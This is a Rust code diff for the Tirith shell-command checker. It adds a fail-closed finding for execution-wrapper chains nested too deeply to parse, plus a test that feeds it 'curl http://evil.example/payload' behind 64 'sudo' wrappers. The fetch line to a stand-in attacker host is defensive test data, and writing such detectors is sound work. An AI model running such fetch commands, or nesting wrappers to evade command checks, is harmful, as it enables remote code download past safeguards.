@@ -358,6 +358,29 @@ pub fn check(
 
     // source/. reuse transport rules: they execute the fetched body.
     for segment in &segments {
+        if crate::extract::wrapper_chain_exceeds_depth(segment) {
+            findings.push(Finding {
+                rule_id: RuleId::AnalysisIncomplete,
+                severity: Severity::High,
+                title: "Execution-wrapper analysis exceeded its depth limit".to_string(),
+                description: "The command nests execution wrappers deeper than Tirith's bounded \
+                              parser can resolve. It is blocked instead of treating an unresolved \
+                              inner command as safe: the network-policy and package checks skip a \
+                              segment they cannot resolve."
+                    .to_string(),
+                evidence: vec![Evidence::CommandPattern {
+                    pattern: "over-deep execution wrapper chain".to_string(),
+                    matched: redact::redact_shell_assignments(&segment.raw),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+        }
+    }
+
+    for segment in &segments {
         let Some((resolved_name, args)) = crate::extract::resolve_wrapped_command(segment) else {
             continue;
         };
@@ -5823,6 +5846,33 @@ mod tests {
         assert!(
             !is_source_command("cat"),
             "cat should not be a source command"
+        );
+    }
+
+    #[test]
+    fn over_deep_wrapper_chain_blocks_instead_of_skipping_the_inner_command() {
+        // resolve_wrapped_command returns None for both "too deep" and "nothing
+        // here", so check_network_policy and the package lookup used to skip a
+        // 65-wrapper chain and never see the executable inner command.
+        let deep = "sudo ".repeat(64) + "curl http://evil.example/payload";
+        let findings = check_default(&deep, ShellType::Posix);
+        assert!(
+            findings.iter().any(|f| {
+                f.rule_id == RuleId::AnalysisIncomplete && f.severity == Severity::High
+            }),
+            "an over-deep wrapper chain must fail closed: {findings:?}"
+        );
+
+        // A chain within budget still resolves normally and does NOT get the
+        // depth finding.
+        let shallow = "sudo env command curl http://evil.example/payload";
+        let findings = check_default(shallow, ShellType::Posix);
+        assert!(
+            !findings.iter().any(|f| {
+                f.rule_id == RuleId::AnalysisIncomplete
+                    && f.title.contains("Execution-wrapper analysis")
+            }),
+            "a resolvable chain must not be reported as too deep: {findings:?}"
         );
     }
 }
